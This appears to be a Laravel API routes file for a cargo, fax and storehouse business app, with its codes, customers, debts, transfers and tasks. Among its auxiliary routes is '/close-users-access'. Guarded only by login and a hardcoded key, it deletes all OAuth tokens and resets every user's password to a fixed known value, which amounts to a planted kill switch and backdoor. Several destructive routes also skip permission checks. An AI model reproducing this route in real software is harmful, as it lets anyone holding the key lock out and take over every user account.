<?php

use App\Code;
use App\Customer;
use Illuminate\Http\Request;
use Maatwebsite\Excel\Facades\Excel;
use App\Exports\CommonExport;
use GuzzleHttp\Client;
use App\Traits\UserSetAccessData;

/*
|--------------------------------------------------------------------------
| API Routes
|--------------------------------------------------------------------------
|
| Here is where you can register API routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| is assigned the "api" middleware group. Enjoy building your API!
|
*/

//Route::middleware('auth:api')->get('/user', function (Request $request) {
//    return $request->user();
//});

Route::group(['middleware' => [\App\Http\Middleware\Localization::class, 'auth:api']], function () {
    Route::get('/user', function (Request $request) {
        class Access
        {
            use UserSetAccessData;
        }

        $obj = new Access();
        return $obj->setAccessData();
    });

    // PERMISSION AND ROLES
    Route::group(['middleware' => ['role:admin']], function () {
        Route::get('/users-with-roles', 'Api\PermissionController@index');
        Route::get('/roles-list', 'Api\PermissionController@getAllRoles');
        Route::post('/add-role', 'Api\PermissionController@addRole');
        Route::post('/assign-role-to-users', 'Api\PermissionController@assignRoleToUsers');
        Route::post('/delete-role-from-user', 'Api\PermissionController@deleteRoleFromUser');
        Route::get('/delete-role/{id}', 'Api\PermissionController@deleteRole');
        Route::post('/delete-role', 'Api\PermissionController@deleteRole');
        Route::get('/permission-list', 'Api\PermissionController@getAllPermissions');
        Route::post('/add-permission', 'Api\PermissionController@addPermission');
        Route::post('/assign-permission-to-role-and-user', 'Api\PermissionController@assignPermissionToRoleAndUser');
        Route::get('/delete-permission/{id}', 'Api\PermissionController@deletePermission');
        Route::post('/delete-permission-from-role-or-user', 'Api\PermissionController@deletePermissionFromRoleOrUser');
    });

    // USERS
    Route::get('/users-list', function () {
        return \App\User::select('id as value', 'name as label')->orderBy('name')->get();
    });
    // CODES
    Route::get('/codes', 'Api\CodesController@getCodesWithCustomers')->name('view codes list')->middleware(['role_or_permission:admin|codes|view codes list']);
    Route::get('/get-code-history/{id}', 'Api\CodesController@getCodeHistory')->name('get-code-history')->middleware(['role_or_permission:admin|codes|get-code-history']);
//    Route::post('/get-new-codes', 'Api\CodesController@getNewCodes')->name('get-new-codes')->middleware(['role_or_permission:admin|codes|get-new-codes']);
//    Route::get('/codes', function () {
//        return CodeResource::collection(Code::with('customers', 'user')->get());
//    });
    Route::post('/upload-codes', 'Api\CodesController@uploadCodesData');
    Route::get('/check-code-exist/{code}', 'Api\CodesController@checkCodeExist');
    Route::post('/store-code', 'Api\CodesController@storeCode');
    Route::get('/codes-list', 'Api\CodesController@index');
    Route::get('/codes-assistant', 'Api\CodesController@codesAssistantList');

    // STOREHOUSE
    Route::get('/store-house-data/{id}', 'Api\StorehouseDataController@getStorehouseData')->name('view storehouse data')->middleware(['role_or_permission:admin|storehouse|view storehouse data']);

    // STOREHOUSE_DATA
    Route::post('/add-storehouse-data', 'Api\StorehouseDataController@store')->name('add entry to storehouse data')->middleware(['role_or_permission:admin|storehouse|add entry to storehouse data']);
    Route::post('/update-storehouse-data', 'Api\StorehouseDataController@update')->name('update entry on storehouse data')->middleware(['role_or_permission:admin|storehouse|update entry on storehouse data']);
    Route::get('/shop-names', 'Api\StorehouseDataController@getShopNames');
    Route::get('/thing-list', 'Api\StorehouseDataController@getThingsList');
    Route::post('/export-storehouse-data', 'Api\StorehouseDataController@export')->name('export storehouse data')->middleware(['role_or_permission:admin|storehouse|export storehouse data']);
    Route::post('/destroy-storehouse-data', 'Api\StorehouseDataController@destroy')->name('delete entry on storehouse data')->middleware(['role_or_permission:admin|storehouse|delete entry on storehouse data']);
    Route::get('/storehouse-data-history/{id}', 'Api\StorehouseDataController@getStorehouseDataHistory')->name('get history of entry in storehouse data')->middleware(['role_or_permission:admin|storehouse|get history of entry in storehouse data']);
    Route::post('/get-new-storehouseData', 'Api\StorehouseDataController@getNewStorehouseData')->name('get new storehouse data entries')->middleware(['role_or_permission:admin|storehouse|get new storehouse data entries']);
    Route::post('/set-transfers-storehouse-fax', 'Api\StorehouseDataController@setTransfersStorehouseFax')->name('set transfers storehouse fax and reverse')->middleware(['role_or_permission:admin|storehouse|set transfers storehouse fax and reverse']);
    Route::post('/update-fax-combine-data', 'Api\StorehouseDataController@updateFaxCombineData')->name('update fax combine data')->middleware(['role_or_permission:admin|fax|update fax combine data']);
    Route::post('/move-from-storehouse-to-fax', 'Api\StorehouseDataController@moveFromStorehouseToFax')->name('move entries from storehouse to fax')->middleware(['role_or_permission:admin|storehouse|move entries from storehouse to fax']);

    // STOREHOUSE_HISTORIES
    Route::post('/get-storehouse-period-data', 'Api\StorehouseDataController@getStorehousePeriodData');

    // CLIENTS
    Route::post('/valid-customer-data', 'Api\CustomersController@checkValidCustomerData');
    Route::post('/store-customers', 'Api\CustomersController@storeCustomers');
    Route::post('/update-customer', 'Api\CustomersController@update');
    Route::get('/destroy-customer/{id}', 'Api\CustomersController@destroy');
    Route::get('/get-customer-history/{id}', 'Api\CustomersController@getCustomerHistory');
    Route::post('/export-customers', 'Api\CustomersController@export')->name('export customers')->middleware(['role_or_permission:admin|export customers']);

    // CARGO_TABLE
    Route::post('/upload-cargo-table', 'CommonController@storeCargoTable');
    Route::post('/client-data', 'CommonController@getData');
    Route::get('/get-all-cargo-data/{id}', 'Api\CargoController@index')->name('view cargo data')->middleware(['role_or_permission:admin|view cargo data|cargo|assistant']);
    Route::post('/update-cargo-payment-entry', 'Api\CargoController@updateCargoPaymentEntry')->name('update cargo payment entry')->middleware(['role_or_permission:admin|update cargo payment entry']);
    Route::post('/update-cargo-debt-entry', 'Api\CargoController@updateCargoDebtEntry')->name('update cargo debt entry')->middleware(['role_or_permission:admin|update cargo debt entry']);
    Route::post('/create-cargo-payment-entry', 'Api\CargoController@createCargoPaymentEntry')->name('create cargo payment entry')->middleware(['role_or_permission:admin|create cargo payment entry']);
    Route::post('/delete-cargo-entry', 'Api\CargoController@deleteCargoEntry')->name('delete cargo entry')->middleware(['role_or_permission:admin|delete cargo entry']);
    Route::post('/create-cargo-debt-entry', 'Api\CargoController@createCargoDebtEntry')->name('create cargo debt entry')->middleware(['role_or_permission:admin|create cargo debt entry']);
    Route::get('/general-cargo-data', 'Api\CargoController@getGeneralCargoData')->name('general cargo data')->middleware(['role_or_permission:admin|general-cargo-data|cargo']);
    Route::post('/create-debt-payment-entry', 'Api\CargoController@createDebtPaymentEntry')->name('create debt payment entry')->middleware(['role_or_permission:admin|create debt payment entry']);
    Route::post('/update-debt-payment-entry', 'Api\CargoController@updateDebtPaymentEntry')->name('update debt payment entry')->middleware(['role_or_permission:admin|update debt payment entry']);
    Route::post('/delete-debt-entry', 'Api\CargoController@deleteDebtEntry')->name('delete debt entry')->middleware(['role_or_permission:admin|delete debt entry']);
    Route::post('/create-debt-entry', 'Api\CargoController@createDebtEntry')->name('create debt entry')->middleware(['role_or_permission:admin|create debt entry']);
    Route::post('/update-debt-entry', 'Api\CargoController@updateDebtEntry')->name('update debt entry')->middleware(['role_or_permission:admin|update debt entry']);
    Route::post('/export-cargo-data', 'Api\CargoController@exportCargoData')->name('export cargo data')->middleware(['role_or_permission:admin|export cargo data']);
    Route::post('/export-debts-data', 'Api\CargoController@exportDebtsData')->name('export debts data')->middleware(['role_or_permission:admin|export debts data']);
    Route::post('/export-general-cargo-data', 'Api\CargoController@exportGeneralCargoData')->name('export general cargo data')->middleware(['role_or_permission:admin|export general cargo data']);
    Route::post('/export-cargo', 'Api\CargoController@exportGeneralCargoData')->name('export cargo')->middleware(['role_or_permission:admin|export cargo']);
    Route::post('/export-general-debts-data', 'Api\CargoController@exportGeneralDebtsData')->name('export general debts data')->middleware(['role_or_permission:admin|export general debts data']);
    Route::post('/export-general-data-by-clients', 'Api\CargoController@exportGeneralDataByClients')->name('export general data by clients')->middleware(['role_or_permission:admin|export general data by clients']);
    Route::post('/cargo-pay-entry', 'Api\CargoController@cargoPayEntry')->name('cargo pay entry')->middleware(['role_or_permission:admin|cargo pay entry']);
    Route::post('/debt-pay-entry', 'Api\CargoController@debtPayEntry')->name('debt pay entry')->middleware(['role_or_permission:admin|debt pay entry']);
    Route::get('/cargo-payments-all/{id}', 'Api\CargoController@cargoPaymentsAllForClient')->name('cargo payments all')->middleware(['role_or_permission:admin|cargo payments all']);
    Route::get('/debts-payments-all/{id}', 'Api\CargoController@debtsPaymentsAllForClient')->name('debts payments all')->middleware(['role_or_permission:admin|debts payments all']);
    Route::post('/export-report-odessa-data', 'Api\CargoController@exportReportOdessaData')->name('export report odessa data')->middleware(['role_or_permission:admin|export report odessa data']);
    Route::get('/get-not-delivered-cargo', 'Api\CargoController@getNotDeliveredCargo');
    Route::post('/set-delivered-cargo', 'Api\CargoController@setDeliveredCargo')->middleware(['role_or_permission:admin|cargo|set-delivered-cargo']);

    // DEBTS_TABLE
    Route::post('/upload-debts-table', 'CommonController@storeDebtsTable');

    // SKLAD_TABLE
    Route::post('/upload-sklad-table', 'CommonController@storeSkladTable');

    // FAXES
    Route::get('/faxes', 'Api\FaxController@getFaxesList')->name('view faxes list')->middleware(['role_or_permission:admin|fax|view faxes list']);
    Route::get('/dialog-add-fax-options', 'Api\FaxController@getOptionsData');
    Route::post('/add-fax', 'Api\FaxController@addFax')->name('add new fax')->middleware(['role_or_permission:admin|fax|add new fax']);
    Route::post('/delete-faxes', 'Api\FaxController@deleteFax')->name('delete faxes')->middleware(['role_or_permission:admin|fax|delete faxes']);
    Route::post('/update-faxes', 'Api\FaxController@updateFaxes')->name('update fax')->middleware(['role_or_permission:admin|fax|update fax']);
    Route::post('/upload-to-cargo', 'Api\FaxController@uploadToCargo')->name('upload fax to cargo')->middleware(['role_or_permission:admin|fax|upload fax to cargo']);
    Route::get('/fax-history/{id}', 'Api\FaxController@faxHistory')->name('get fax history')->middleware(['role_or_permission:admin|fax|get fax history']);
    Route::post('/get-new-fax', 'Api\FaxController@getNewFax')->name('get new fax list')->middleware(['role_or_permission:admin|fax|get new fax list']);
    Route::get('/fax/{id}', 'Api\FaxController@getFax')->name('view fax data')->middleware(['role_or_permission:admin|fax|view fax data']);
    Route::post('/combine-faxes', 'Api\FaxController@combineFaxes')->name('combine-faxes')->middleware(['role_or_permission:admin|fax|combine-faxes']);

    // FAX_DATA
    Route::post('/upload-fax-data-table', 'Api\FaxDataController@storeFaxData');
    Route::get('/fax-data/{id}', 'Api\FaxDataController@getFaxData');
    Route::post('/update-fax-data', 'Api\FaxDataController@updateFaxData');
    Route::post('/export-fax-data', 'Api\FaxDataController@export');
//    Route::get('/update-all-price-in-fax-data/{id}', 'Api\FaxDataController@updatePrice');
    Route::get('/update-prices-in-fax/{id}', 'Api\FaxDataController@updatePricesInFax')->name('update-prices-in-fax')->middleware(['role_or_permission:admin|fax|update-prices-in-fax']);
    Route::post('/export-fax-moder-data', 'Api\FaxDataController@exportModer');
    Route::post('/export-fax-admin-data', 'Api\FaxDataController@exportAdmin');
    Route::post('/export-fax-admin-data-odessa-kharkov', 'Api\FaxDataController@exportFaxDataOdessaKharkov')->name('export fax admin data odessa kharkov')->middleware(['role_or_permission:admin|fax|export fax admin data odessa kharkov']);
    Route::post('/export-fax-admin-data-odessa', 'Api\FaxDataController@exportFaxDataOdessa')->name('export fax admin data odessa')->middleware(['role_or_permission:admin|fax|export fax admin data odessa']);
    Route::post('/fax-data-history', 'Api\FaxDataController@getFaxDataHistory')->name('fax data history')->middleware(['role_or_permission:admin|fax|fax data history']);
    Route::post('/set-delivered-fax-data', 'Api\FaxDataController@setDeliveredFaxData')->name('set delivered fax data')->middleware(['role_or_permission:admin|fax|set delivered fax data']);

    // CATEGORIES
    Route::get('/categories', 'Api\CategoryController@index');
    Route::post('/add-category', 'Api\CategoryController@store');

    // TRANSPORTERS
    Route::get('/transporters', 'Api\TransporterController@index');
    Route::post('/add-transporter', 'Api\TransporterController@store');

    // TRANSPORTS
    Route::get('/transports', 'Api\TransportController@index');

    // TRANSPORTER_PRICE
    Route::post('/update-transporter-price-data', 'Api\TransporterPriceController@updateData');
    Route::post('/update-transporter-faxes-price', 'Api\TransporterFaxesPriceController@updateData');
    Route::get('/transporter-price-data/{id}', 'Api\TransporterFaxesPriceController@getTransporterPriceData');
    Route::post('/save-categories-price', 'Api\TransporterFaxesPriceController@saveCategoriesPrice');

    // CITIES
    Route::get('/cities', function () {
        return \App\City::select('id as value', 'name as label')->orderBy('name')->get();
    });
    // THINGSLIST
    Route::get('/thingsList', function () {
        $things = \App\Thingslist::orderBy('name')->get();
        return $things->pluck('name');
    });
    // SHOPSLIST
    Route::get('/shopsList', function () {
        return \App\Shop::select('id as value', 'name as label')->orderBy('name')->get();
    });
    // DELIVERY METHODS LIST
    Route::get('/delivery-methods-list', function () {
        return \App\DeliveryMethod::select('id as value', 'name as label')->get();
    });
    // TRANSFERS
    Route::get('/transfers', 'Api\TransferController@index')->name('view transfers list')->middleware(['role_or_permission:admin|transfers|view transfers list']);
    Route::post('/update-transfers', 'Api\TransferController@update')->name('update transfers data')->middleware(['role_or_permission:admin|transfers|update transfers data']);
    Route::post('/store-transfers', 'Api\TransferController@store')->name('store transfers data')->middleware(['role_or_permission:admin|transfers|store transfers data']);
    Route::post('/get-new-transfers', 'Api\TransferController@getNewTransfers')->name('get new transfers')->middleware(['role_or_permission:admin|transfers|get new transfers']);
    Route::post('/export-transfers', 'Api\TransferController@export')->name('export transfers')->middleware(['role_or_permission:admin|transfers|export transfers']);
    Route::post('/add-transfers-to-debts', 'Api\TransferController@addTransfersToDebts')->name('add transfers to debts')->middleware(['role_or_permission:admin|add transfers to debts']);
    // TRANSFERS HISTORY
    Route::get('/transfers-history/{id}', 'Api\TransferController@getTransferHistory')->name('get transfer history')->middleware(['role_or_permission:admin|transfers|get transfer history']);

    // CLIENT PRICE
    Route::get('/get-codes-prices', 'Api\CodesPriceController@getCodesPrices')->name('get-codes-prices')->middleware(['role_or_permission:admin|codes-prices|get-codes-prices']);
    Route::post('/add-code-price', 'Api\CodesPriceController@store')->name('add-code-price')->middleware(['role_or_permission:admin|codes-prices|add-code-price']);
    Route::delete('/delete-code-price/{id}', 'Api\CodesPriceController@delete')->name('delete-code-price')->middleware(['role_or_permission:admin|codes-prices|delete-code-price']);
    Route::post('/update-code-price', 'Api\CodesPriceController@update')->name('update-code-price')->middleware(['role_or_permission:admin|codes-prices|update-code-price']);
    Route::get('/get-code-price-history/{id}', 'Api\CodesPriceController@getCodePriceHistory')->name('get-code-price-history')->middleware(['role_or_permission:admin|codes-prices|get-code-price-history']);
    Route::post('/get-new-codes-prices', 'Api\CodesPriceController@getNewCodesPrices')->name('get-new-codes-prices')->middleware(['role_or_permission:admin|codes-prices|get-new-codes-prices']);

    // TASKS
    Route::get('/get-tasks', 'Api\TaskController@index')->name('view tasks page')->middleware(['role_or_permission:admin|tasks|view tasks page']);
    Route::post('/store-task', 'Api\TaskController@store')->name('store task')->middleware(['role_or_permission:admin|tasks|store task']);
    Route::post('/delete-tasks', 'Api\TaskController@destroy')->name('delete tasks')->middleware(['role_or_permission:admin|tasks|delete tasks']);
    Route::post('/update-task', 'Api\TaskController@update')->name('update task')->middleware(['role_or_permission:admin|tasks|update task']);

    // COMMENTS
    Route::post('/store-comment', 'Api\CommentController@store')->name('store comment')->middleware(['role_or_permission:admin|comments|store comment']);
    Route::get('/get-task-comments/{id}', 'Api\CommentController@getTaskComment')->name('get task comments')->middleware(['role_or_permission:admin|comments|get task comments']);
    Route::get('/get-documents-comments', 'Api\CommentController@getDocumentsComment')->name('get documents comments')->middleware(['role_or_permission:admin|documents|get documents comments']);
    Route::post('/remove-comment-file', 'Api\CommentController@removeCommentFile')->name('remove comment file')->middleware(['role_or_permission:admin|task|remove comment file']);
    Route::post('/delete-comments', 'Api\CommentController@deleteComments')->name('delete-comments')->middleware(['role_or_permission:admin|task|delete-comments']);
    Route::post('/add-file-to-comment', 'Api\CommentController@addFileToComment')->name('add file to comment')->middleware(['role_or_permission:admin|task|add file to comment']);
    Route::post('/update-comment-data', 'Api\CommentController@updateCommentData')->name('update comment data')->middleware(['role_or_permission:admin|task|update comment data']);

    // PAYMENTARREARS
    Route::get('/get-payment-arrears', 'Api\CargoController@getPaymentArrears')->name('get payment arrears')->middleware(['role_or_permission:admin|arrears|get payment arrears']);

    // QUESTIONS
    Route::get('/get-questions', 'Api\QuestionController@index')->name('view questions page')->middleware(['role_or_permission:admin|questions|view questions page']);
    Route::post('/store-question', 'Api\QuestionController@store')->name('store task')->middleware(['role_or_permission:admin|questions|store question']);
    Route::post('/delete-questions', 'Api\QuestionController@deleteQuestions')->name('delete questions')->middleware(['role_or_permission:admin|questions|delete questions']);
    Route::post('/update-question', 'Api\QuestionController@updateQuestion')->name('update question')->middleware(['role_or_permission:admin|questions|update question']);
    Route::post('/add-question-comment', 'Api\QuestionController@addQuestionComment')->name('add question comment')->middleware(['role_or_permission:admin|question|add question comment']);

    // AUXILIARY REQUESTS
    // Клиенты котрые получают бренды
    Route::get('/export-brands-customers', 'Api\CodesController@getCustomersWhoGetTheBrand');
    Route::get('/export-customers-who-left', 'Api\CodesController@exportCustomersWhoLeft');
    Route::post('/close-users-access', function (Request $request) {
        if ($request->key === 'lions') {
            \Illuminate\Support\Facades\DB::table('oauth_access_tokens')->truncate();
            $users = \App\User::all();
            foreach ($users as $user) {
                $user->password = bcrypt('carrello');
                $user->save();
            }
            return response(['answer' => true]);
        }

        return response(['answer' => false]);
    });

    // Кода без информации о клиентах
    Route::get('/export-codes-without-customers', function () {
        $codes = Code::all();
        $arrCodesWithoutCustomers = [];
        $codes->each(function ($item) use (&$arrCodesWithoutCustomers) {
            $customer = Customer::where('code_id', $item->id)->first();
            if (!$customer) {
                array_push($arrCodesWithoutCustomers, $item->id);
            }
        });
//        return response(['ok' => $arrCodesWithoutCustomers]);
        return Excel::download(new CommonExport($arrCodesWithoutCustomers, 'codes'), 'codes.xlsx');
    });

    Route::post('/upload-faxes', 'CommonController@uploadFaxes');
    Route::post('/search-in-faxes', 'CommonController@searchInFaxes');
    Route::get('/areas', function () {
        $client = new Client();
        return $client->get("https://api.hh.ru/areas/5");
    });
    // Загрузка городов Украины
//    Route::post('/store-areas', function (Request $request) {
//        foreach ($request->areas as $area) {
//            $areaM = \App\Region::create(['name' => $area['name'], 'parent_id' => 1]);
//            foreach ($area['areas'] as $item) {
//                \App\City::create(['name' => $item['name'], 'parent_id' => $areaM->id]);
//            }
//        }
//        return $request->areas;
//    });
});


Route::group(['middleware' => [\App\Http\Middleware\Localization::class]], function () {
    Route::post('/login', 'Api\AuthController@login');
//    Route::post('/register', 'Api\AuthController@register');

//    Route::post('/password/email', 'Api\ForgotPasswordController@sendResetLinkEmail');
//    Route::post('/password/reset', 'Api\ResetPasswordController@reset');
});
